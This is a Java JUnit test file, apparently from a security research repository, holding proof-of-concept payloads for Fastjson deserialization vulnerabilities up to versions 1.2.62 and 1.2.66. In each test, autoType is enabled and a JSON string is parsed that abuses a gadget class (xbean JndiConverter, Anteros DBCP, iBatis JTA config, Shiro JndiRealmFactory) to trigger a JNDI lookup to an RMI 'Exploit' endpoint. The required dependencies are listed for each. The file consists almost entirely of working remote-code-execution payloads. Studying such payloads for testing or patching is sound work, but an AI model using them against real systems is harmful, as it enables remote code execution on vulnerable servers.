package me.mole;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.jupiter.api.Test;

public class Fastjson1248to67ApplicationTest {

    /**
     *  fastjson <= 1.2.62
     *
     *  依赖包：
     *      <dependency>
     *          <groupId>org.apache.xbean</groupId>
     *          <artifactId>xbean-reflect</artifactId>
     *          <version>4.20</version>
     *      </dependency>
     */
    @Test
    public void test_1262_poc_1() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String fj_poc = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:8085/Exploit\"}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    /**
     *  fastjson <= 1.2.66
     *
     *  依赖包：
     *    <dependency>
     *        <groupId>br.com.anteros</groupId>
     *        <artifactId>Anteros-DBCP</artifactId>
     *        <version>1.0.1</version>
     *    </dependency>
     */
    @Test
    public void test_1266_poc_1() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String fj_poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://127.0.0.1:8085/Exploit\"}";
        //or: use healthCheckRegistry
        String fj_poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"rmi://127.0.0.1:8085/Exploit\"}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    /**
     *  fastjson <= 1.2.66
     *
     *  依赖包：
     *    <dependency>
     *         <groupId>org.mybatis</groupId>
     *         <artifactId>mybatis2</artifactId>
     *         <version>2.4.4</version>
     *    </dependency>
     *    <dependency>
     *         <groupId>javax.transaction</groupId>
     *         <artifactId>jta</artifactId>
     *         <version>1.1</version>
     *    </dependency>
     */
    @Test
    public void test_1266_poc_2() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String fj_poc = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"UserTransaction\":\"rmi://127.0.0.1:8085/Exploit\"}}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }

    /**
     *  fastjson <= 1.2.66
     *
     *  依赖包：
     *    <dependency>
     *       <groupId>org.apache.shiro</groupId>
     *       <artifactId>shiro-core</artifactId>
     *       <version>1.8.0</version>
     *    </dependency>
     */
    @Test
    public void test_1266_poc_3() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String fj_poc = "{\"@type\": \"org.apache.shiro.realm.jndi.JndiRealmFactory\",\"jndiNames\": [\"rmi://127.0.0.1:8085/Exploit\"], \"realms\":[\"\"]}";
        System.out.println(fj_poc);
        JSON.parse(fj_poc);
    }
}
